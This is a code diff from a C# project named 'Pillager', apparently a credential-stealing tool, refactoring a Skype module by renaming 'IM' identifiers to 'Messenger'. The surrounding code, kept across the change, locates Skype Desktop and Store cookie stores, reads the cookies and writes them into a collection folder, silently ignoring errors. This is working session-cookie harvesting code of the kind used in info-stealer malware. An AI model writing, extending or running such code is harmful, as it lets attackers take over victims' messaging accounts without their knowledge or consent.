@@ -3,13 +3,13 @@ using System;
 using System.IO;
 using System.Text;
 
-namespace Pillager.IM
+namespace Pillager.Messengers
 {
     internal class Skype
     {
-        public static string IMName = "Skype";
+        public static string MessengerName = "Skype";
 
-        public static string[] IMPaths = new string[]
+        public static string[] MessengerPaths = new string[]
         {
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "Microsoft\\Skype for Desktop"),
@@ -17,10 +17,10 @@ namespace Pillager.IM
                 "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
         };
 
-        public static string Skype_cookies(string IMPath)
+        public static string Skype_cookies(string MessengerPath)
         {
             StringBuilder cookies = new StringBuilder();
-            string skype_cookies_path = Path.Combine(IMPath, "Network\\Cookies");
+            string skype_cookies_path = Path.Combine(MessengerPath, "Network\\Cookies");
             if (!File.Exists(skype_cookies_path)) return null;
             try
             {
@@ -54,13 +54,13 @@ namespace Pillager.IM
         {
             try
             {
-                if (!Directory.Exists(IMPaths[0]) && !Directory.Exists(IMPaths[1])) return;
-                string savepath = Path.Combine(path, IMName);
+                if (!Directory.Exists(MessengerPaths[0]) && !Directory.Exists(MessengerPaths[1])) return;
+                string savepath = Path.Combine(path, MessengerName);
                 Directory.CreateDirectory(savepath);
-                string Desktop = Skype_cookies(IMPaths[0]);
-                string Store = Skype_cookies(IMPaths[1]);
-                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, IMName + "_Desktop.txt"), Desktop);
-                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, IMName + "_Store.txt"), Store);
+                string Desktop = Skype_cookies(MessengerPaths[0]);
+                string Store = Skype_cookies(MessengerPaths[1]);
+                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Desktop.txt"), Desktop);
+                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Store.txt"), Store);
             }
             catch { }
         }
